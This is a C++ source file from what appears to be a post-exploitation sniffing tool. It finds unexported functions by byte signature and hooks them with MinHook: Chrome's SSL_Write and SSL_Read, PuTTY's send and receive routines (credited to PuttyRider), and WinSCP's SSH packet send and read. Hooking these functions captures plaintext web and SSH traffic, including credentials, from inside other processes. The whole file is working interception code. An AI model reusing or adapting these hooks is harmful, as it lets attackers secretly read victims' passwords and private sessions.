
#include "stdafx.h"
#include "NonExportedHooks.h"

// Chrome 64

void HookChrome()
{
	SECTION_INFO rdata = {0, 0};
	SECTION_INFO text  = {0, 0};

	// 64 bits signatures

	unsigned char Write_Signature64[] = { 
		0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x49, 0x89, 0xD6, 0x41, 
		0xC6, 0x06, 0x00, 0x44, 0x89, 0xCD, 0x4D, 0x89, 0xC7, 0x48, 0x89, 0xCF, 0x48, 0x8B, 0x47, 0x30 };
	unsigned char Read_Signature64[] = {
		0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x44, 0x89, 0xC6, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCB, 
		0xE8, '?' , '?' , '?' , '?' , 0x85, 0xC0, 0x7E, 0x2C, 0x85, 0xF6, 0x7E, 0x2A, 0x48, 0x63, 0xCE };

	// 32 bits signatures

	unsigned char Write_Signature32[] = {
		0x55, 0x89, 0xE5, 0x53, 0x57, 0x56, 0x83, 0xEC, 0x08, 0xA1, '?' , '?' , '?' , '?' , 0x8B, 0x7D, 
		0x08, 0x89, 0x45, 0xF0, 0x8B, 0x47, 0x20, 0xC7, 0x80, 0x98, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00 };
	unsigned char Read_Signature32[] = {
		0x55, 0x89, 0xE5, 0x57, 0x56, 0x8B, 0x7D, 0x08, 0x89, 0xF9, 0xE8, '?' , '?' , '?' , '?' , 0x89, 
		0xC6, 0x85, 0xF6, 0x7E, 0x2D, 0x8B, 0x4D, 0x10, 0x85, 0xC9, 0x7E, 0x20, 0x8B, 0x47, 0x20, 0x8B };

	// Get section

	text  = Process::GetModuleSection("chrome.dll", ".text");

	// Check if chrome

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome text section!");
		return;
	}

	// Search memory

	ADDRESS_VALUE pWrite64 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature64, sizeof(Write_Signature64));
	ADDRESS_VALUE pRead64  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature64, sizeof(Read_Signature64));

	ADDRESS_VALUE pWrite32 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature32, sizeof(Write_Signature32));
	ADDRESS_VALUE pRead32  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature32, sizeof(Read_Signature32));

	// We have the x64 versions

	if(pWrite64 && pRead64)
	{
		// Add hooks

		SSL_Write_Original64 = (SSL_Write_Typedef64)pWrite64;
		SSL_Read_Original64  = (SSL_Read_Typedef64)pRead64;

		MH_CreateHook((void *)pWrite64, (void *)SSL_Write_Callback64, &((void *)SSL_Write_Original64));
		MH_CreateHook((void *)pRead64,  (void *)SSL_Read_Callback64,  &((void *)SSL_Read_Original64));

		return;
	}

	// We have the x86 versions

	if (pWrite32 && pRead32)
	{
		// Add hooks

		SSL_Write_Original32 = (SSL_Write_Typedef32)pWrite32;
		SSL_Read_Original32  = (SSL_Read_Typedef32)pRead32;

		MH_CreateHook((void *)pWrite32, (void *)SSL_Write_Callback32, &((void *)SSL_Write_Original32));
		MH_CreateHook((void *)pRead32,  (void *)SSL_Read_Callback32,  &((void *)SSL_Read_Original32));

		return;
	}

	DebugLog::Log("[ERROR] Cannot get Chrome SSL functions!");
}

// Hook Putty - (c) PuttyRider - Adrian Furtuna

void HookPutty()
{
	SECTION_INFO text  = {0, 0};
	unsigned char SEND_string[] = {0x51, 0x53, 0x55, 0x56, 0x8b, 0x74, 0x24, 0x14, 0x57, 0x8b, 
		0x7c, 0x24, 0x20, 0x33, 0xed, 0x3b, 0xfd, 0x89, 0x6c, 0x24, 0x10 };
	unsigned char RECV_string[] = {0x56, 0xff, 0x74, 0x24, 0x14, 0x8b, 0x74, 0x24, 0x0c, 0xff, 
		0x74, 0x24, 0x14, 0x8d, 0x46, 0x60, 0x50, 0xe8};

	//Get .text section

	text  = Process::GetModuleSection("putty.exe", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Putty section!");
		return;
	}

	// Serach functions

	ADDRESS_VALUE pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 21);
	ADDRESS_VALUE pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 18);

	if(pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Putty functions!");
		return;
	}

	// Add hooks

	PuttySend_Original = (PuttySend_Typedef)pSend;
	PuttyRecv_Original = (PuttyRecv_Typedef)pRecv;

	MH_CreateHook((void *)pSend, (void *)PuttySend_Callback, &((void *)pSend));
	MH_CreateHook((void *)pRecv, (void *)PuttyRecv_Callback, &((void *)pRecv));
}

// Hook WinSCP

void HookWinSCP()
{
	SECTION_INFO text  = {0, 0};
	unsigned char SEND_string[] = { 0x55, 0x8B, 0xEC, 0x8B, 0x55, 0x0C, 0x8B, 0x45, 0x08, 0x83, 0xB8, 0x2C, 0x01, 0x00, 0x00 };
	unsigned char RECV_string[] = { 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xE4, 0x53, 0x56, 0x57, 0x8B, 0x75, 0x10, 0x8B, 0x5D, 0x08 };

	//Get .text section

	text  = Process::GetModuleSection("winscp.exe", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP section!");
		return;
	}

	// Serach functions

	ADDRESS_VALUE pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 15);
	ADDRESS_VALUE pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 15);

	if(pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP functions!");
		return;
	}

	// Add hooks

	SSH_Pktsend_Original = (SSH_Pktsend_Typedef)pSend;
	SSH_Rdpkt_Original = (SSH_Rdpkt_Typedef)pRecv;

	MH_CreateHook((void *)pSend, (void *)SSH_Pktsend_Callback, &((void *)pSend));
	MH_CreateHook((void *)pRecv, (void *)SSH_Rdpkt_Callback, &((void *)pRecv));
}

